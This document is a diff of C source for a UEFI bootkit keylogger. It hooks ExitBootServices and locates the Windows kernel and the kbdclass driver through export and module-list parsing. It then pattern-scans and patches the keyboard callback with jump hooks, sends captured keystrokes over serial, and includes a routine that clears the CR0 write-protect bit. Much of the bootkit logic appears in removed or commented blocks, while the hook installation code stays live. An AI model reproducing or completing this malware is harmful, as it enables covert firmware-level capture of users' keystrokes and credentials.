@@ -60,6 +60,18 @@ VOID* g_KeyLoggerPtr = NULL;
  * https://learn.microsoft.com/en-us/previous-versions/ff542324(v=vs.85) -> MSDN!!!!!!!
  * 5) Print chars using SerialWrite.
  */
+
+extern VOID HookEntry(void);
+extern VOID MyKeyboardCallbackHook1(void);
+
+UINT8 g_OriginalKbdBytes[14];
+BOOLEAN IsKeyboardDriverName(UNICODE_STRING* DriverName);
+VOID ScanForKeyboardDriver();
+PKLDR_DATA_TABLE_ENTRY FindKbdclassModule();
+BOOLEAN GetTextSection(VOID* ImageBase, VOID** TextBase, UINT32* TextSize);
+VOID* FindKeyboardCallback( VOID* TextBase, UINT32 TextSize);
+BOOLEAN InstallKeyboardHook(VOID* Target);
+
 char kbd_US[128] =
 {
     0, 27, '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-', '=', '\b',
@@ -95,18 +107,6 @@ char kbd_US[128] =
     0,
 };
 
-extern VOID HookEntry(void);
-extern VOID MyKeyboardCallbackHook1(void);
-
-UINT8 g_OriginalKbdBytes[14];
-BOOLEAN IsKeyboardDriverName(UNICODE_STRING* DriverName);
-VOID ScanForKeyboardDriver();
-PKLDR_DATA_TABLE_ENTRY FindKbdclassModule();
-BOOLEAN GetTextSection(VOID* ImageBase, VOID** TextBase, UINT32* TextSize);
-VOID* FindKeyboardCallback( VOID* TextBase, UINT32 TextSize);
-BOOLEAN InstallKeyboardHook(VOID* Target);
-
- 
 VOID SerialWrite(CHAR8 *str)
 {
     while (*str) {
@@ -125,19 +125,6 @@ VOID SerialWriteHex(UINT64 val)
     }
     buf[18] = '\n'; buf[19] = '\r'; buf[20] = 0;
     SerialWrite(buf);
-}
-
-//not in use for now
-VOID WriteHook(VOID* Dest, VOID* Src, UINTN Size) {
-    SerialWrite("Attempting to disable WP bit...\n\r");
-    UINT64 cr0 = AsmReadCr0();
-    AsmWriteCr0(cr0 & ~0x10000ULL); 
-    
-    SerialWrite("Writing bytes to destination...\n\r");
-    CopyMem(Dest, Src, Size);
-    
-    AsmWriteCr0(cr0); 
-    SerialWrite("WP bit restored.\n\r");
 }
 
 //print, for addresses in kernel
@@ -191,146 +178,6 @@ VOID DumpBytesInline(VOID* Address, UINTN Count) {
     SerialWrite("\n\r");
 }
 
-/*
-//finding function by name in Export Table
-VOID* EFIAPI FindNtosExportByName(VOID *kernelBase , CHAR8* exportName)
-{
-    SerialWrite("hello from FindNtosExportByName \n");
-    SerialWrite("kernelBase = ");
-    SerialWriteHex((UINT64)kernelBase);
-    SerialWrite("exportName = ");
-    SerialWrite(exportName);
-    EFI_IMAGE_DOS_HEADER* DosHeaders = (EFI_IMAGE_DOS_HEADER*)kernelBase;
-    EFI_IMAGE_NT_HEADERS64* NtHeaders = (EFI_IMAGE_NT_HEADERS64*)((UINT8*)kernelBase + DosHeaders->e_lfanew);
-    UINT32 exportDirRva = NtHeaders->OptionalHeader.DataDirectory[EFI_IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
-    if (exportDirRva == 0) {
-            SerialWrite("here \n");
-        return NULL;
-    }
-    EFI_IMAGE_EXPORT_DIRECTORY* ExportDirReal = (EFI_IMAGE_EXPORT_DIRECTORY*)(exportDirRva + (UINT8*)kernelBase);
-    UINT32* names = (UINT32*)((UINT8*)kernelBase + ExportDirReal -> AddressOfNames);
-    UINT32* functions = (UINT32*)((UINT8*)kernelBase + ExportDirReal -> AddressOfFunctions);
-    UINT16* ordinals = (UINT16*)((UINT8*)kernelBase + ExportDirReal -> AddressOfNameOrdinals);
-
-    for (UINT32 i = 0; i < ExportDirReal->NumberOfNames; i++)
-    {
-        CHAR8* currentName = (CHAR8*)((UINT8*)kernelBase + names[i]);
-        if (AsciiStrCmp(currentName, exportName) == 0)
-        {
-            //found!!!
-            UINT32 FuncRVA = functions[ordinals[i]];
-            VOID* finalAddress = (VOID*)((UINT8*)kernelBase + FuncRVA);
-            SerialWrite("Found Export: ");
-            SerialWrite(exportName);
-            SerialWrite(" at: ");
-            SerialWriteHex((UINT64)finalAddress);
-            return finalAddress;
-        }
-    }
-    SerialWrite("Export NOT found\n");
-    return NULL;
-}
-
-
-PKLDR_DATA_TABLE_ENTRY FindKbdclassModule()
-{
-    if (!g_PsLoadedModuleList)
-        return NULL;
-
-    LIST_ENTRY* head = g_PsLoadedModuleList;
-    LIST_ENTRY* next = head->ForwardLink;
-    UINT32 count = 0;
-    while (next != head && count < 500)
-    {
-        PKLDR_DATA_TABLE_ENTRY module = CONTAINING_RECORD(next, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
-
-        if (module->BaseDllName.Buffer)
-        {
-            CHAR16* name = module->BaseDllName.Buffer;
-            if ((name[0] == L'k' || name[0] == L'K') && (name[1] == L'b' || name[1] == L'B') && (name[2] == L'd' || name[2] == L'D'))
-            {
-                return module;
-            }
-        }
-        next = next->ForwardLink;
-        count++;
-    }
-
-    return NULL;
-}
-*/
-/*
-//ckeck if the driver is KeyBoardDriver
-BOOLEAN IsKeyboardDriverName(UNICODE_STRING* DriverName)
-{
-    CHAR16* name = DriverName->Buffer;
-    UINT16 len = DriverName->Length / 2;
-
-    for (UINT16 i = 0; i < len - 3; i++) {
-
-        if ((name[i] == L'k' || name[i] == L'K') &&
-            (name[i + 1] == L'b' || name[i + 1] == L'B') &&
-            (name[i + 2] == L'd' || name[i + 2] == L'D'))
-        {
-            return TRUE;
-        }
-    }
-
-    return FALSE;
-}
-*/
-/*
-VOID EFIAPI CheckDriverCallback(UNICODE_STRING* DriverName)
-{
-    if (!DriverName || !DriverName->Buffer)
-        return;
-
-    if (IsKeyboardDriverName(DriverName))
-    {
-        if (!g_KeyboardFound)
-        {
-            SerialWrite("!!! Target Detected: kbdclass is loading, arming scanner... !!!\n\r");
-            g_KeyboardFound = 1;
-        }
-    }
-
-    if (g_KeyboardFound && g_PsLoadedModuleList)
-    {
-        SerialWrite("\n\r--- Scanning PsLoadedModuleList ---\n\r");
-
-        ScanForKeyboardDriver();
-    }
-}
-*/
-
-/*
-BOOLEAN GetTextSection(VOID* ImageBase, VOID** TextBase, UINT32* TextSize)
-{
-    EFI_IMAGE_DOS_HEADER* dos = (EFI_IMAGE_DOS_HEADER*)ImageBase;
-    if (dos->e_magic != 0x5A4D)
-        return FALSE;
-
-    EFI_IMAGE_NT_HEADERS64* nt = (EFI_IMAGE_NT_HEADERS64*)((UINT8*)ImageBase + dos->e_lfanew);
-
-    if (nt->Signature != 0x00004550)
-        return FALSE;
-
-    EFI_IMAGE_SECTION_HEADER* section = (EFI_IMAGE_SECTION_HEADER*)((UINT8*)nt + sizeof(UINT32) + sizeof(EFI_IMAGE_FILE_HEADER) + nt->FileHeader.SizeOfOptionalHeader);
-
-    for (UINT16 i = 0; i < nt->FileHeader.NumberOfSections; i++)
-    {
-        if (CompareMem(section[i].Name, ".text", 5) == 0)
-        {
-            *TextBase = (UINT8*)ImageBase + section[i].VirtualAddress;
-            *TextSize = section[i].Misc.VirtualSize;
-            return TRUE;
-        }
-    }
-
-    return FALSE;
-}
-*/
-
 VOID* FindKeyboardCallback( VOID* TextBase, UINT32 TextSize)
 {
     UINT8 pattern[] =
@@ -353,6 +200,7 @@ VOID* FindKeyboardCallback( VOID* TextBase, UINT32 TextSize)
     return FindPattern(TextBase, TextSize, pattern, sizeof(pattern));
 
 }
+
 
 VOID DirectInstallMmHook(VOID* TargetFunction)
 {
@@ -408,11 +256,7 @@ BOOLEAN InstallKeyboardHook(VOID* Target)
     return TRUE;
 }
 
-char upper(char tav)
-{
-    // a -> A
-    return tav - 0x20;
-}
+
 // Set to fastcall like windows calling convention.
 VOID EFIAPI MyKeyboardCallbackHook(VOID* DeviceObject, KEYBOARD_INPUT_DATA* InputDataStart,KEYBOARD_INPUT_DATA* InputDataEnd, UINT32* InputDataConsumed)
 {
@@ -427,79 +271,6 @@ VOID EFIAPI MyKeyboardCallbackHook(VOID* DeviceObject, KEYBOARD_INPUT_DATA* Inpu
         }
     }
 }
-
-// NT_SUCCESS(status = NtInitiatePowerAction(
-//         2,
-//         2,
-//         0,
-//         0
-//         )))
-
-
-
-    // for (KEYBOARD_INPUT_DATA* scan = InputDataStart; scan < InputDataEnd; scan++) {
-    //     if (!(scan->Flags & 0x0001)) {
-    //         SerialWrite("KBD Hook: Key Pressed! ScanCode: ");
-    //         SerialWriteHex((UINT64)scan->MakeCode);
-    //     }
-    // }
-    // CopyMem(g_TargetKbdAddr, g_OriginalKbdBytes, 14);
-
-    // typedef VOID (EFIAPI *KBD_CALLBACK)(VOID*, VOID*, VOID*, VOID*);
-    // ((KBD_CALLBACK)g_TargetKbdAddr)(DeviceObject, InputDataStart, InputDataEnd, InputDataConsumed);
-
-    // UINT8 jmpInstructions[14] = { 0xFF, 0x25, 0x00, 0x00, 0x00, 0x00, 0,0,0,0,0,0,0,0 };
-    // *(UINT64*)(&jmpInstructions[6]) = (UINT64)g_VirtualKbdHookPtr;
-    // WriteHook(g_TargetKbdAddr, jmpInstructions, 14);
-
-/*
-VOID ScanForKeyboardDriver()
-{
-    PKLDR_DATA_TABLE_ENTRY module = FindKbdclassModule();
-    if (!module)
-    {
-        SerialWrite("kbdclass not found\n\r");
-        return;
-    }
-    g_KbdBaseAddress = module->DllBase;
-    SerialWrite("\n\r****************************************\n\r");
-    SerialWrite("Base Address: ");
-    SerialWriteHex((UINT64)g_KbdBaseAddress);
-    SerialWrite("****************************************\n\r\n\r");
-    VOID* textBase = NULL;
-    UINT32 textSize = 0;
-
-    if (!GetTextSection( g_KbdBaseAddress, &textBase, &textSize))
-    {
-        SerialWrite("Failed locating .text\n\r");
-        g_KeyboardFound = 0;
-        return;
-    }
-
-    SerialWrite("Found .text section!\n\r");
-    SerialWrite("VirtualAddress: ");
-    SerialWriteHex((UINT64)textBase);
-    SerialWrite("VirtualSize: ");
-    SerialWriteHex((UINT64)textSize);
-    VOID* callback = FindKeyboardCallback( textBase, textSize);
-
-    if (callback)
-    {
-        SerialWrite("Candidate callback:\n\r");
-        SerialWriteHex((UINT64)callback);
-        //SerialWrite("About to read memory...\n\r");
-        //DumpBytesInline(callback, 64);
-    }
-    if (!callback)
-    {
-        SerialWrite("Pattern Scan Failed - Check Signature !!!\n\r");
-        g_KeyboardFound = 0;
-        return;
-    }
-    InstallKeyboardHook(callback);
-    g_KeyboardFound = 0;
-}
-*/
 
 EFI_STATUS InstallPureAsmHook(VOID* TargetFunction)
 {
@@ -531,128 +302,3 @@ EFI_STATUS InstallPureAsmHook(VOID* TargetFunction)
     SerialWrite("Hook installed successfully with JMP r10\n");
     return EFI_SUCCESS;
 }
-/**
-VOID EFIAPI NotifySetVirtualAddressMap(EFI_EVENT Event, VOID* Context)
-{
-    SerialWrite("winloadVA: ");
-    SerialWriteHex(winloadReturnAddress);
-
-    // Sig LogOsLanchScanBase func
-    UINT8 sig[] = {0x48, 0xB8, 0x77, 0xBE, 0x9F, 0x1A, 0x2F, 0xDD};
-     
-    VOID * LogOsLanchScanBase = FindPattern((VOID*)winloadReturnAddress,0x10000,sig,sizeof(sig));
-
-    if (LogOsLanchScanBase) {
-        SerialWrite("LogOsLanchScanBase: ");
-        SerialWriteHex((UINT64)LogOsLanchScanBase);    
-    }
-    PLOADER_PARAMETER_BLOCK loaderBlock = *(PLOADER_PARAMETER_BLOCK*)(*(UINT32*)(LogOsLanchScanBase + 0x10) + LogOsLanchScanBase + 0x14); 
-    if (NULL == loaderBlock)
-    {
-        SerialWrite("FUCK loaderBlock\n");
-    }
-    KLDR_DATA_TABLE_ENTRY *kernelEntery =  CONTAINING_RECORD(loaderBlock->LoadOrderListHead.ForwardLink, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
-    if (kernelEntery) {
-        SerialWrite("kernel base address: ");
-        SerialWriteHex((UINT64)kernelEntery->DllBase);
-        SerialWrite("kernel dump: ");
-        SerialWriteHex((UINT64)kernelEntery->DllBase);
-        VOID* mmLoadAddress = FindNtosExportByName(kernelEntery->DllBase, "MmLoadSystemImage");
-        if (mmLoadAddress) {
-            SerialWrite("MmLoadSystemImage found, installing hook...\n");
-            InstallPureAsmHook(mmLoadAddress);        
-        }
-    VOID* psListExport = FindNtosExportByName(kernelEntery->DllBase, "PsLoadedModuleList");
-
-    if (psListExport) {
-        g_PsLoadedModuleList = (LIST_ENTRY*)psListExport;
-        SerialWrite("PsLoadedModuleList found and initialized!\n\r");
-    }
-    }
-    gRT->ConvertPointer(0, (VOID**)&g_TargetKbdAddr);
-    gRT->ConvertPointer(0, (VOID**)&g_PsLoadedModuleList);
-    g_RuntimeKeyboardHook = (VOID*)MyKeyboardCallbackHook;
-    gRT->ConvertPointer(0, &g_RuntimeKeyboardHook);
-}
-
-EFI_STATUS EFIAPI HookedExitBootServices(EFI_HANDLE ImageHandle, UINTN MapKey)
-{
-    // returnAddress is somewhere inside winload.efi!OslFwpKernelSetupPhase1
-    winloadReturnAddress = (UINT64)__builtin_return_address(0);
-    Print(L"OslFwpKernelSetupPhase1   -> (phys) 0x%p\n", winloadReturnAddress);
-
-    // restore before calling
-    gBS->ExitBootServices = originalExitBootServices;
-
-    return originalExitBootServices(ImageHandle, MapKey);
-}
-
-VOID DebugCheckAddress(VOID* addr)
-{
-    EFI_MEMORY_DESCRIPTOR *MemoryMap = NULL;
-    UINTN MapSize = 0;
-    UINTN MapKey;
-    UINTN DescriptorSize;
-    UINT32 DescriptorVersion;
-
-    gBS->GetMemoryMap(&MapSize, MemoryMap, &MapKey, &DescriptorSize, &DescriptorVersion);
-
-    MapSize += 0x1000;
-    if (EFI_ERROR(gBS->AllocatePool(EfiBootServicesData, MapSize, (VOID**)&MemoryMap))) {
-        Print(L"AllocatePool failed\n");
-        return;
-    }
-
-    if (EFI_ERROR(gBS->GetMemoryMap(&MapSize, MemoryMap, &MapKey, &DescriptorSize, &DescriptorVersion))) {
-        Print(L"GetMemoryMap failed\n");
-        return;
-    }
-
-    EFI_MEMORY_DESCRIPTOR* desc = MemoryMap;
-
-    for (UINTN i = 0; i < MapSize / DescriptorSize; i++) {
-        UINT64 start = desc->PhysicalStart;
-        UINT64 end   = start + desc->NumberOfPages * 4096;
-
-        if ((UINT64)addr >= start && (UINT64)addr < end) {
-            Print(L"\n[FOUND ADDRESS]\n");
-            Print(L"Addr = %p\n", addr);
-            Print(L"Type = %d\n", desc->Type);
-            Print(L"Start = %lx End = %lx\n", start, end);
-        }
-
-        desc = (EFI_MEMORY_DESCRIPTOR*)((UINT8*)desc + DescriptorSize);
-    }
-}
-
-EFI_STATUS EFIAPI HookEntryPoint(IN EFI_HANDLE ImageHandle, IN EFI_SYSTEM_TABLE *SystemTable)
-{
-    EFI_STATUS status;
-    EFI_EVENT event;
-
-    Print(L"\n\n\n");
-    Print(L"================================================\n");
-    Print(L"          BOOTKIT IS RUNNING                     \n");
-    Print(L"          HookEntryPoint executed successfully!  \n");
-    Print(L"================================================\n\n");
-
-    gBS = SystemTable->BootServices;
-
-    Print(L"[DEBUG] Checking HookEntry address...\n");
-    DebugCheckAddress((VOID*)HookEntry);
-    
-    status = gBS->CreateEvent(EVT_SIGNAL_VIRTUAL_ADDRESS_CHANGE, TPL_NOTIFY, NotifySetVirtualAddressMap, NULL, &event);
-
-    if (EFI_ERROR(status)) {
-        Print(L"[-] CreateEventEx failed: %r\n", status);
-        return status;
-    }
-    Print(L"[+] EVT_SIGNAL_VIRTUAL_ADDRESS_CHANGE registered\n");
-
-    originalExitBootServices  = gBS->ExitBootServices;
-    gBS->ExitBootServices     = HookedExitBootServices;
-    Print(L"[+] HookedExitBootServices registered\n");
-
-    return EFI_SUCCESS;
-}
-*/
